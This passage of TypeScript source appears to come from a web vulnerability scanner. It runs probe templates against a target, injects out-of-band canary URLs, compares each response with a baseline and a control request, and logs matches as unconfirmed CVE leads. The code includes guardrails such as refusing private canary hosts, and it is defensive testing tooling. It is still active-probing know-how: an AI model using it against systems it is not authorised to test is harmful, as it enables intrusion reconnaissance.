  const protectedPaths = (req.discoveredPaths?.protectedPaths ?? []).filter(p => p.startsWith('/')).slice(0, 6)
  const apiPaths = (req.discoveredPaths?.apiPaths ?? []).filter(p => p.startsWith('/')).slice(0, 6)
  const dynamicVars: Record<string, string> = {
    ...(protectedPaths[0] ? { discovered_protected_path: protectedPaths[0] } : {}),
    ...(apiPaths[0] ? { discovered_api_path: apiPaths[0] } : {}),
  }
  let templatesRun = 0
  let calibration: SurfaceCalibration | null = null

  try {
    const cal = await calibrateOrigin(runner, origin)
    calibration = cal
    const runId = req.runId ?? 'surface-engine'
    const assignment = req.storage && req.assignmentId ? req.storage.worker(req.assignmentId) : undefined
    const run = req.storage && req.runId ? req.storage.run(req.runId) : undefined

    await runner.pool(selection.selected, async template => {
      const vars: Record<string, string> = {
        rand: randToken(8),
        guardian_canary_http: '',
        guardian_canary_dns: '',
        ...dynamicVars,
      }
      if (templateNeedsDiscoveredPath(template) && !pathResolves(template, vars)) {
        skipped.push({ id: template.id, reason: 'no discovered path for dynamic placeholder' })
        return
      }
      let canaryToken: string | null = null
      if (template.matchers.some(m => m.type === 'canary')) {
        if (!canaryBroker) { skipped.push({ id: template.id, reason: 'canary unavailable' }); return }
        let info = canaryBroker.listenerInfo()
        if (!info.running) info = await canaryBroker.startListener()
        let host = ''
        try { host = info.effectiveBaseUrl ? new URL(info.effectiveBaseUrl).hostname : '' } catch { /* ignored */ }
        const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
        if (!host || (isPrivateOrLoopbackHost(host) && !localLab)) {
          skipped.push({ id: template.id, reason: 'canary base URL is private' })
          return
        }
        const minted = canaryBroker.mintCanary(runId, `template:${template.id}`, origin, req.storage ? { storage: req.storage, assignmentId: req.assignmentId } : undefined)
        canaryToken = minted.token
        vars.guardian_canary_http = minted.httpUrl
        vars.guardian_canary_dns = minted.dnsHost
      }

      const path = substitute(template.request.path, vars, true)
      const headers: Record<string, string> = {}
      for (const [k, v] of Object.entries(template.request.headers)) headers[k] = substitute(v, vars, false)
      const body = template.request.body !== undefined ? substitute(template.request.body, vars, false) : undefined
      templatesRun += 1
      const res = await runner.send({ origin, method: template.request.method, pathAndQuery: path, headers, body })
      if (!res.ok) { skipped.push({ id: template.id, reason: `${res.kind}: ${res.message.slice(0, 80)}` }); return }
      const ex = res.ex

      let canaryHit: { hit: boolean; protocol?: string } | null = null
      if (canaryToken && canaryBroker) {
        const deadline = Date.now() + 1500
        for (;;) {
          const check = canaryBroker.checkCanary(canaryToken, req.storage ? { storage: req.storage, runId } : undefined)
          if (check.hit || Date.now() >= deadline || signal.aborted) {
            canaryHit = { hit: check.hit, protocol: check.hits[0]?.protocol }
            break
          }
          await new Promise<void>(resolve => setTimeout(resolve, 200))
        }
      }

      const evaluation = evaluateMatchers(template, ex, canaryHit)
      if (!evaluation.matched) { suppressed.push({ templateId: template.id, reason: 'no_match' }); return }
      const onlyCanary = template.matchers.every(m => m.type === 'canary' || m.type === 'status')
      if (!onlyCanary && matchesBaseline(cal, ex, path)) {
        suppressed.push({ templateId: template.id, reason: 'spa_catchall' })
        return
      }

      let controlStatus: number | null = null
      if (template.control) {
        const controlHeaders: Record<string, string> = {}
        for (const [k, v] of Object.entries(template.control.headers ?? {})) controlHeaders[k] = substitute(v, vars, false)
        const controlPath = substitute(template.control.path ?? template.request.path, vars, true)
        const controlRes = await runner.send({
          origin,
          method: template.control.method ?? template.request.method,
          pathAndQuery: controlPath,
          headers: controlHeaders,
          body: template.control.body !== undefined ? substitute(template.control.body, vars, false) : undefined,
        })
        if (controlRes.ok) {
          controlStatus = controlRes.ex.status
          const controlEval = evaluateMatchers(template, controlRes.ex, null)
          if (controlEval.matched && !template.matchers.some(m => m.type === 'canary')) {
            suppressed.push({ templateId: template.id, reason: 'control_matched' })
            return
          }
        }
      }

      const exchangeId = runner.stage(ex)
      const match: TemplateMatch = {
        templateId: template.id,
        name: template.name,
        severity: template.severity,
        factKind: template.cve ? 'cve_hypothesis' : 'candidate_lead',
        ...(template.cve ? { cve: template.cve } : {}),
        ...(template.cwe ? { cwe: template.cwe } : {}),
        tech: template.tech,
        method: template.request.method,
        path: path.length > 200 ? `${path.slice(0, 200)}…` : path,
        status: ex.status,
        evidence: evaluation.evidence,
        controlStatus,
        exchangeId,
        note: 'Template match is a lead only; confirm via a Declarative Replay Spec (never auto-confirmed).',
      }
      matches.push(match)
      if (req.storage && assignment && run) {
        const summary = template.cve
          ? `${template.cve}: ${template.name} matched on ${template.request.method} ${path} (HTTP ${ex.status}).`
          : `${template.name} lead matched on ${template.request.method} ${path} (HTTP ${ex.status}).`
        try {
          req.storage.addFact(run, assignment, {
            kind: match.factKind === 'cve_hypothesis' ? 'cve_hypothesis' : 'note',
            origin,
            summary,
            data: {
              templateId: template.id,
              ...(template.cve ? { cveId: template.cve } : {}),
              ...(template.cwe ? { cwe: template.cwe } : {}),
              endpoint: path,
              method: template.request.method,
              status: ex.status,
              evidence: evaluation.evidence.slice(0, 3),
              confidence: 'low',
            },
            ...(exchangeId ? { exchangeIds: [exchangeId] } : {}),
            sourceOrigins: [origin],
          })
        } catch {
          // Fact persistence is best-effort; a match is still returned to the caller.
        }
      }
    })
  } catch (err) {
    if (!(err instanceof StopProbe) && !(err instanceof BrokerDenied)) throw err
    if (err instanceof BrokerDenied) runner.stopReason ??= 'denied'
  }

  return {
    origin,
    templatesAvailable: loaded.templates.length,
    templatesSelected: selection.selected.length,
    templatesRun,
    requestsSent: runner.sent,
    maxRequests: max,
    matches,
    suppressed,
    skipped,
    loadErrors: loaded.errors,
    calibration,
    baselineSignature: calibration?.signature ?? 'n/a',
    stoppedReason: runner.stopReason,
    exchangeIds: runner.exchangeIds,
    durationMs: Date.now() - started,
  }
}
